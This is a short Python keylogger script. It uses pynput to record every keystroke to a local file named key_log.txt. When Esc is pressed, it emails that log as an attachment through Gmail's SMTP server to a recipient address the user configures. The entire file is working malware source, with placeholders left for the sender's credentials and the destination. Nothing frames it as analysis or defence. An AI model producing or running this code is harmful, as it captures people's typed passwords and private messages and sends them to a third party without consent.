#Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib



from pynput.keyboard import Key, Listener




keys_information = "key_log.txt"

file_path = r" " # Enter the file path here
extend = "\\"

count = 0
keys = []

email_address = " " #Enter your EmailAddress here
password = " " #Enter your app password here
toaddr = " "  #Enter recipient email here

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
       count = 0
       write_file(keys)
       keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
   if key == Key.esc:
      return False
   
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylog Report"

    body = "Keylog file attached."
    msg.attach(MIMEText(body, 'plain'))

    attachment_file = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment_file.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    s.sendmail(fromaddr, toaddr, msg.as_string())
    s.quit()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

try:
    send_email(keys_information, file_path + extend + keys_information, toaddr)
    print("Email sent successfully")
except Exception as e:
    print(f"Email failed: {e}")